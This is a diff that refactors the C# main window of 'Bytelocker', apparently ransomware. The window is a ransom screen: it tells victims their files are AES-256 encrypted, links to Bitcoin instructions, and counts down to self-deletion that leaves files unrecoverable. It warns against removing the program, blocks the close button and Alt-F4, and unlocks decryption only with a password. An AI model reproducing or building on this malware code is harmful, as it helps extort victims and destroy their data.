@@ -1,38 +1,39 @@
-﻿using Bytelocker.CryptoManager;
-using Bytelocker.Settings;
-using Bytelocker.Tools;
-using System;
+﻿using System;
+using System.Diagnostics;
 using System.Threading;
 using System.Windows.Forms;
+using Bytelocker.CryptoManager;
+using Bytelocker.Settings;
+using Bytelocker.Tools;
 
 namespace Bytelocker.UI
 {
     public partial class MainWindow : Form
     {
-        private TimeManager tm;
-        private PasswordManager pm;
-        private RegistryManager rm;
-
         private const int MAX_FILE_SIZE_LENGHT_UI = 80;
 
+        public static string current_decrypt_file = "null";
+        private string current_decrypt_file_local = "null";
+
+        private readonly LinkLabel llAESInfo;
+        private readonly LinkLabel llListOfInfectedFiles;
+        private PasswordManager pm;
+
         private int progress_bar_inc;
-        private String current_decrypt_file_local = "null";
-
-        public static String current_decrypt_file = "null";
-
-        private LinkLabel llAESInfo, llListOfInfectedFiles;
+        private readonly RegistryManager rm;
+        private readonly TimeManager tm;
 
         public MainWindow()
         {
             InitializeComponent();
             MaximizeBox = false;
-            this.tm = new TimeManager();
-            this.rm = new RegistryManager();
-            this.tm.ReadFromRegistry();
+            tm = new TimeManager();
+            rm = new RegistryManager();
+            tm.ReadFromRegistry();
             llAESInfo = new LinkLabel();
             llListOfInfectedFiles = new LinkLabel();
-            llListOfInfectedFiles.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llListOfInfectedFiles_Click);
-            llAESInfo.LinkClicked += new LinkLabelLinkClickedEventHandler(this.On_llAESInfo_Click);
+            llListOfInfectedFiles.LinkClicked += On_llListOfInfectedFiles_Click;
+            llAESInfo.LinkClicked += On_llAESInfo_Click;
         }
 
         // remove x button
@@ -40,7 +41,7 @@ namespace Bytelocker.UI
         {
             get
             {
-                CreateParams cp = base.CreateParams;
+                var cp = base.CreateParams;
                 cp.ClassStyle = cp.ClassStyle | 0x200;
                 return cp;
             }
@@ -48,93 +49,97 @@ namespace Bytelocker.UI
 
         private void MainWindow_Load(object sender, EventArgs e)
         {
-            this.MainWindowScreenOne();
+            MainWindowScreenOne();
         }
 
         private void MainWindowScreenOne()
         {
-            this.lbCurrentFileDecrypt.Hide();
-            this.pbDecryptProgress.Hide();
-            this.BtnVerify.Hide();
-            this.tbPassInput.Hide();
-            this.rtfInfo.Clear();
-            this.UpdateTime();
+            lbCurrentFileDecrypt.Hide();
+            pbDecryptProgress.Hide();
+            BtnVerify.Hide();
+            tbPassInput.Hide();
+            rtfInfo.Clear();
+            UpdateTime();
 
             llAESInfo.Show();
             llListOfInfectedFiles.Show();
             lbTitle.Show();
 
             // rtf box
-            this.rtfInfo.AppendText("Your important files, documents, pictures, etc. Have been encrypted." + "\n\n");
+            rtfInfo.AppendText("Your important files, documents, pictures, etc. Have been encrypted." + "\n\n");
 
             llListOfInfectedFiles.Text = "Here";
             llListOfInfectedFiles.AutoSize = true;
-            llListOfInfectedFiles.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
-            this.rtfInfo.Controls.Add(llListOfInfectedFiles);
-            this.rtfInfo.AppendText(llListOfInfectedFiles.Text);
-            this.rtfInfo.AppendText(new String(' ', 3));
-            this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;
+            llListOfInfectedFiles.Location = rtfInfo.GetPositionFromCharIndex(rtfInfo.TextLength);
+            rtfInfo.Controls.Add(llListOfInfectedFiles);
+            rtfInfo.AppendText(llListOfInfectedFiles.Text);
+            rtfInfo.AppendText(new string(' ', 3));
+            rtfInfo.SelectionStart = rtfInfo.TextLength;
 
-            this.rtfInfo.AppendText("is a complete list of encrypted files, you can verify this manually." + "\n\n" + "Encryption was produced" +
-                " using");
+            rtfInfo.AppendText("is a complete list of encrypted files, you can verify this manually." + "\n\n" +
+                               "Encryption was produced" +
+                               " using");
 
             llAESInfo.Text = "AES-256";
             llAESInfo.AutoSize = true;
-            llAESInfo.Location = this.rtfInfo.GetPositionFromCharIndex(this.rtfInfo.TextLength);
-            this.rtfInfo.Controls.Add(llAESInfo);
-            this.rtfInfo.AppendText(llAESInfo.Text);
-            this.rtfInfo.AppendText(new String(' ', 3));
-            this.rtfInfo.SelectionStart = this.rtfInfo.TextLength;
+            llAESInfo.Location = rtfInfo.GetPositionFromCharIndex(rtfInfo.TextLength);
+            rtfInfo.Controls.Add(llAESInfo);
+            rtfInfo.AppendText(llAESInfo.Text);
+            rtfInfo.AppendText(new string(' ', 3));
+            rtfInfo.SelectionStart = rtfInfo.TextLength;
 
-            this.rtfInfo.AppendText("in order to decrypt the files, you need to obtain the password used to generate the key." + "\n\n" +
-                "The password will only be available for a limited time, after this, the program will delete itself and there will be no way to recover encrypted files." + "\n\n");
+            rtfInfo.AppendText(
+                "in order to decrypt the files, you need to obtain the password used to generate the key." + "\n\n" +
+                "The password will only be available for a limited time, after this, the program will delete itself and there will be no way to recover encrypted files." +
+                "\n\n");
 
-            this.rtfInfo.AppendText("NOTE: Removal of or modification of this software will lead to inability to decrypt files.");
+            rtfInfo.AppendText(
+                "NOTE: Removal of or modification of this software will lead to inability to decrypt files.");
             // end rtf box
         }
 
         private void BtnNext_Click(object sender, EventArgs e)
         {
-            this.rtfInfo.Clear();
+            rtfInfo.Clear();
             llAESInfo.Hide();
             llListOfInfectedFiles.Hide();
 
-            this.lbTitle.Hide();
-            this.tbPassInput.Show();
-            this.btnNext.Hide();
-            this.BtnVerify.Show();
+            lbTitle.Hide();
+            tbPassInput.Show();
+            btnNext.Hide();
+            BtnVerify.Show();
 
-            this.rtfInfo.AppendText("Enter password to unlock, then click 'Verify' to begin decryption.");
-            this.rtfInfo.Select(this.rtfInfo.GetFirstCharIndexFromLine(0), this.rtfInfo.Lines[0].Length);
-            this.rtfInfo.SelectionBullet = true;
-            this.rtfInfo.DeselectAll();
+            rtfInfo.AppendText("Enter password to unlock, then click 'Verify' to begin decryption.");
+            rtfInfo.Select(rtfInfo.GetFirstCharIndexFromLine(0), rtfInfo.Lines[0].Length);
+            rtfInfo.SelectionBullet = true;
+            rtfInfo.DeselectAll();
         }
 
         private void BtnVerify_Click(object sender, EventArgs e)
         {
-            this.pm = new PasswordManager();
-            this.pm.FetchPassword();
-            if (!(this.tbPassInput.Text == this.pm.returnPassword()))
+            pm = new PasswordManager();
+            pm.FetchPassword();
+            if (!(tbPassInput.Text == pm.returnPassword()))
             {
                 MessageBox.Show("Invalid Password", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
             }
             else
             {
-                this.tmTimeLeftRefresher.Stop();
-                this.BtnVerify.Hide();
-                
-                this.lbTimeLeft.Text = "";
-                this.rtfInfo.Clear();
-                this.tbPassInput.Hide();
-                this.lbTitleTime.Hide();
-                this.lbTitle.Text = "Decrypting . . .";
-                this.lbTitle.Show();
-                this.lbCurrentFileDecrypt.Show();
-                this.pbDecryptProgress.Show();
+                tmTimeLeftRefresher.Stop();
+                BtnVerify.Hide();
 
-                this.progress_bar_inc = this.pbDecryptProgress.Maximum / this.rm.ReadAllValues(RegistryManager.FILES_KEY_NAME).Count;
+                lbTimeLeft.Text = "";
+                rtfInfo.Clear();
+                tbPassInput.Hide();
+                lbTitleTime.Hide();
+                lbTitle.Text = "Decrypting . . .";
+                lbTitle.Show();
+                lbCurrentFileDecrypt.Show();
+                pbDecryptProgress.Show();
 
-                this.tmTimerDecrypt.Start();
+                progress_bar_inc = pbDecryptProgress.Maximum / rm.ReadAllValues(RegistryManager.FILES_KEY_NAME).Count;
+
+                tmTimerDecrypt.Start();
 
                 new Thread(() =>
                 {
@@ -143,7 +148,7 @@ namespace Bytelocker.UI
                 }).Start();
             }
 
-            this.pm = null;
+            pm = null;
         }
 
         // override alt-f4
@@ -154,77 +159,76 @@ namespace Bytelocker.UI
 
         private void On_llAESInfo_Click(object sender, EventArgs e)
         {
-            System.Diagnostics.Process.Start("https://en.wikipedia.org/wiki/Advanced_Encryption_Standard");
+            Process.Start("https://en.wikipedia.org/wiki/Advanced_Encryption_Standard");
         }
 
         private void On_llBitcoinInfo_Click(object sender, EventArgs e)
         {
-            System.Diagnostics.Process.Start("https://bitcoin.org/en/getting-started");
+            Process.Start("https://bitcoin.org/en/getting-started");
         }
 
 
         private void On_llListOfInfectedFiles_Click(object sender, EventArgs e)
         {
-            this.LaunchListOfEncryptedFilesWindow();
+            LaunchListOfEncryptedFilesWindow();
         }
 
         private void UpdateTimeLeftEvent(object sender, EventArgs e)
         {
-            this.UpdateTime();
+            UpdateTime();
         }
 
 
         private void tmTimerDecrypt_Tick(object sender, EventArgs e)
         {
-            if (!(this.rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null"))
+            if (!(rm.ReadAllValues(RegistryManager.FILES_KEY_NAME)[0] == "null"))
             {
-                if (!(this.current_decrypt_file_local == current_decrypt_file))
+                if (!(current_decrypt_file_local == current_decrypt_file))
                 {
-                    this.current_decrypt_file_local = current_decrypt_file;
+                    current_decrypt_file_local = current_decrypt_file;
 
                     if (current_decrypt_file.Length > MAX_FILE_SIZE_LENGHT_UI)
-                    {
-                        this.lbCurrentFileDecrypt.Text = TruncateFilePath.ShrinkPath(current_decrypt_file, MAX_FILE_SIZE_LENGHT_UI);
-                    } else
-                    {
-                        this.lbCurrentFileDecrypt.Text = current_decrypt_file;
-                    }
+                        lbCurrentFileDecrypt.Text =
+                            TruncateFilePath.ShrinkPath(current_decrypt_file, MAX_FILE_SIZE_LENGHT_UI);
+                    else
+                        lbCurrentFileDecrypt.Text = current_decrypt_file;
 
-                    this.pbDecryptProgress.Increment(this.progress_bar_inc);
+                    pbDecryptProgress.Increment(progress_bar_inc);
                 }
             }
             else
             {
-                this.tmTimerDecrypt.Stop();
-                this.pbDecryptProgress.Value = this.pbDecryptProgress.Maximum;
-                MessageBox.Show("Finished Decrypting. Software will now uninstall.", "Finished", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                this.Visible = false;
+                tmTimerDecrypt.Stop();
+                pbDecryptProgress.Value = pbDecryptProgress.Maximum;
+                MessageBox.Show("Finished Decrypting. Software will now uninstall.", "Finished", MessageBoxButtons.OK,
+                    MessageBoxIcon.Information);
+                Visible = false;
                 Bytelocker.Uninstall();
             }
         }
 
         private void UpdateTime()
         {
-            int timeLeftSeconds = (int)this.tm.DetermineRemainingTimeInSeconds();
+            var timeLeftSeconds = (int) tm.DetermineRemainingTimeInSeconds();
 
             if (timeLeftSeconds < 0)
             {
-                this.tmTimeLeftRefresher.Stop();
-                this.lbTimeLeft.Text = "00:00:00:00";
+                tmTimeLeftRefresher.Stop();
+                lbTimeLeft.Text = "00:00:00:00";
 
                 // if time is 0, uninstall program
-                this.Visible = false;
+                Visible = false;
                 Bytelocker.Uninstall();
             }
             else
             {
-                this.lbTimeLeft.Text = (TimeSpan.FromSeconds(timeLeftSeconds)).ToString(@"dd\:hh\:mm\:ss");
+                lbTimeLeft.Text = TimeSpan.FromSeconds(timeLeftSeconds).ToString(@"dd\:hh\:mm\:ss");
             }
         }
 
         private void LaunchListOfEncryptedFilesWindow()
         {
-            EncryptedFilesList efl = new EncryptedFilesList();
+            var efl = new EncryptedFilesList();
             efl.ShowDialog();
         }
     }
